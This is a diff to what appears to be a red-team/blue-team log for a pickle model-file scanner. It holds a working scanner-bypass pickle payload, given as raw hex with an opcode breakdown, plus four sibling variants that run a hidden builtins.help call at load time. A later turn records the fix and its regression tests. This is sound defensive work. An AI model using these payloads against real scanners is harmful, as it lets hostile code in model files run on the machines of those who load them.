@@ -18009,3 +18009,245 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3824 passed, 1022 skipped, 21 warnings in 46.86s
 ```
+
+## Turn 271 - Bypass via residual `operator` mutator receivers
+
+Offensive turn after the Turn 270 defense. The new `operator` protocol table is
+receiver-aware, but it only models list/dict receivers for the proven cases.
+Other clean stdlib receivers delegate to the same iterable-consuming source
+operations and still bypass the scanner.
+
+Smallest representative found this turn:
+
+```python
+operator.iadd(collections.deque(), iter(builtins.help, "stop"))
+```
+
+For `collections.deque`, in-place add extends the deque from the right-hand
+iterable. A call iterator on the right-hand side is therefore drained during
+`pickle.loads`, invoking `builtins.help()` and importing shadowable `pydoc`.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086f70657261746f728c0469616464938c0b636f6c6c656374696f6e738c056465717565932952680086522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+62: STACK_GLOBAL operator.iadd
+83: STACK_GLOBAL collections.deque
+84: EMPTY_TUPLE
+85: REDUCE              # collections.deque()
+86: BINGET 0            # call iterator
+88: TUPLE2
+89: REDUCE              # operator.iadd(deque(), call_iterator), drains rhs
+90: STOP
+```
+
+Scanner proof:
+
+```text
+payload_len 91
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18, False),
+  ('builtins', 'help', 35, False),
+  ('operator', 'iadd', 62, False),
+  ('collections', 'deque', 83, False),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'deque', 0, 85),
+  ('operator', 'iadd', 2, 89),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type deque
+runtime_repr deque(['owned-value'])
+marker_exists True
+marker_text owned-by-iadd-deque
+```
+
+Sibling probes from the same receiver-coverage gap:
+
+```text
+operator.iconcat(collections.deque(), iter(help, "stop"))
+payload_len 94
+scan clean findings 0 errors ()
+runtime_type deque
+runtime_repr deque(['owned-value'])
+marker_exists True
+marker_text owned-by-iconcat-deque
+
+operator.iadd(collections.UserList(), iter(help, "stop"))
+payload_len 94
+scan clean findings 0 errors ()
+runtime_type UserList
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-iadd-userlist
+
+operator.setitem(collections.UserList(), slice(None), iter(help, "stop"))
+payload_len 122
+scan clean findings 0 errors ()
+runtime_type NoneType
+runtime_repr None
+marker_exists True
+marker_text owned-by-setitem-userlist
+
+operator.setitem(bytearray(b""), slice(None), iter(help, "stop"))
+payload_len 122
+scan clean findings 0 errors ()
+runtime_type NoneType
+runtime_repr None
+marker_exists True
+marker_text owned-by-setitem-bytearray
+```
+
+Why it bypasses:
+
+- Turn 270 correctly models `operator.iadd` and `operator.iconcat` for list
+  receivers, plus `operator.setitem` for list slice assignment.
+- `collections.deque` and `collections.UserList` use the same in-place
+  extension source behavior, but they are represented as constructed stdlib
+  values, not built-in `list` primitives.
+- `bytearray` slice assignment consumes an iterable of integers through
+  `operator.setitem`, but Turn 270 only treats list slice assignment as a
+  consuming sink.
+- The imported globals remain clean: `builtins.help`, `operator.iadd`,
+  `operator.iconcat`, `operator.setitem`, `collections.deque`,
+  `collections.UserList`, and `builtins.bytearray`.
+- Native metadata records only the visible reducer invocation and never emits
+  the hidden zero-argument `builtins.help()` call.
+
+Likely source-level defense:
+
+- Broaden the Turn 270 receiver-aware table to cover known clean mutable
+  sequence receivers with iterable-consuming protocol operations:
+  `list`, `collections.deque`, `collections.UserList`, and `bytearray` where
+  the operation actually accepts generic iterables.
+- Keep exact operation/receiver pairs:
+  `iadd`/`iconcat` for `list`, `deque`, and `UserList`; `setitem` with a slice
+  for `list`, `UserList`, and `bytearray`.
+- Keep the numeric-receiver negative from Turn 270; the receiver expansion
+  should stay type-aware rather than marking every `operator.iadd`.
+
+Performance note:
+
+- The representative payload is 91 bytes.
+- Warm scan median over 1000 runs was `0.000066s`, p95 `0.000075s`, and max
+  `0.001131s`.
+
+## Turn 272 - Block residual `operator` mutator receivers
+
+Defensive turn for the Turn 271 bypass. The fix broadens the existing
+receiver-aware `operator` protocol table rather than adding new dangerous
+globals. It keeps the operation/receiver matrix exact because similar-looking
+operations have different consumption behavior.
+
+Focused change:
+
+```text
+operator.iadd(list|deque|UserList, call_iterator) -> drains rhs
+operator.iconcat(list|deque, call_iterator) -> drains rhs
+operator.setitem(list|UserList|bytearray, slice, call_iterator) -> drains value
+```
+
+Boundaries kept:
+
+```text
+operator.iadd(int, call_iterator) -> TypeError without advancing rhs
+operator.iadd(bytearray, call_iterator) -> TypeError without advancing rhs
+operator.iconcat(UserList, call_iterator) -> TypeError without advancing rhs
+```
+
+Post-fix proof for the Turn 271 representative payload:
+
+```text
+payload_len 91
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('operator', 'iadd', 62),
+  ('collections', 'deque', 83),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'deque', 0, 85),
+  ('operator', 'iadd', 2, 89),
+  ('builtins', 'help', 0, 89),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+runtime_rc 0
+runtime_type deque
+runtime_repr deque(['owned-value'])
+marker_exists True
+marker_text owned-by-iadd-deque
+runtime_stderr
+```
+
+Regression coverage:
+
+- Added malicious positives for `operator.iadd(deque(), iter(help, "stop"))`
+  and `operator.iconcat(deque(), iter(help, "stop"))`.
+- Added malicious positives for `operator.iadd(UserList(), iter(help, "stop"))`
+  and `operator.setitem(UserList(), slice(None), iter(help, "stop"))`.
+- Added a malicious positive for
+  `operator.setitem(bytearray(b""), slice(None), iter(help, "stop"))`.
+- Added clean runtime-proven negatives for bytearray `iadd` and UserList
+  `iconcat`, in addition to the existing numeric `iadd` negative.
+
+Simplification note:
+
+- The receiver predicates split add, concat, and slice assignment instead of
+  sharing one broad "mutable sequence" bucket. This avoids the false positive
+  discovered during validation: `operator.iconcat(UserList(), iterator)` raises
+  before advancing the iterator.
+- The scanner still models one finite source primitive: public `operator`
+  protocol dispatch over known receiver shapes.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000139s`, p95
+  `0.000150s`, max `0.000302s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted operator protocol receiver regressions
+12 passed in 0.66s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+116 passed in 3.09s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+154 passed in 4.83s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3831 passed, 1022 skipped, 21 warnings in 37.08s
+```
